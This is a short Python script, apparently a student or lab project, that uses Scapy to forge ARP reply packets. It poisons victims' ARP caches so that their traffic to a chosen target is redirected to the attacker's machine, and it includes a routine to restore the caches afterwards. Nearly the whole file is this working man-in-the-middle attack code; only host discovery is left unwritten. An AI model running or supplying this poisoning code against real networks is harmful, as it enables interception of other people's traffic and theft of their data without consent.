from scapy.all import *


def create_arp_packet(packet_Information: dict):

    # op = 2 sets the arp table
    # hwsrc and hwdst = MAC address of src and dst
    # psrc and pdst = ip adress of src and dst
    # Set ipdst and macdst of target, such that arp_spoof reaches them
    # Set Ipsrc of victem to spoof
    # Set macsrc to yourself, such that you become the "server"
    arp_packet = ARP(
        op=packet_Information["op"],
        psrc=packet_Information["psrc"],
        pdst=packet_Information["pdst"],
        hwsrc=packet_Information["hwsrc"],
        hwdst=packet_Information["hwdst"],
    )
    return arp_packet


def set_up_arp_packet(inf_victim: dict, inf_target: dict, inf_host: dict, poison: bool = False):
    inf_packet: dict = {}
    # Set packet to set information
    inf_packet["op"] = 2
    inf_packet["psrc"] = inf_target["ip"]
    inf_packet["hwsrc"] = inf_target["mac"]
    inf_packet["pdst"] = inf_victim["pdst"]
    inf_packet["hwdst"] = inf_victim["hwdst"]
    if poison == True:
        inf_packet["hwsrc"] = inf_host["mac"]

    return create_arp_packet(inf_packet)


def poison_victims(victims: list[dict], targets: list[dict], hosts: list[dict]):
    for host in hosts:
        for victim in victims:
            for target in targets:
                # Check if all 3 are different
                if host != victim != target != host:
                    arp_poison_packet = set_up_arp_packet(
                        victim, target, host, poison=True)
                    send_packet(arp_poison_packet)


def restore_victims(victims: list[dict], targets: list[dict]):
    for victim in victims:
        for target in targets:
            if victim != target:
                arp_restore_packet = set_up_arp_packet(victim, target, {})
                send_packet(arp_restore_packet)


# send sends on layer 3, sendp sends at layer 2
# layer 2 and thus sendp requires more information
# extend this function to make use of send and sendp
def send_packet(packet, link_layer=3):
    if link_layer == 3:
        send(packet)
        return
    print("not implemented yet")


if __name__ == "__main__":
    # Assuming Information is gotten from ip discovery
    #
    pass
